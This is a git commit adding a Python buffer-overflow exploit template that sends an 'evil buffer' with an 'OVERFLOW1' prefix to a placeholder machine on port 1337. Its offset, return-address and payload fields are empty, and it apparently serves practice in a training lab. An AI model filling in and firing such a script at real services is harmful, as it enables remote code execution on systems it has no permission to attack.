ff5043274a4ed1014d9d2238ebe44624b33a0bd6
Christian Urcuqui <ulcamilo@gmail.com>
2022-07-01 22:18:01 -0500

    Create bufferoverlow.py

---
+++ Python - Scripts/3+/Network_Basics/bufferoverlow.py
@@ -0,0 +1,24 @@
+import socket
+
+ip = "MACHINE_IP"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
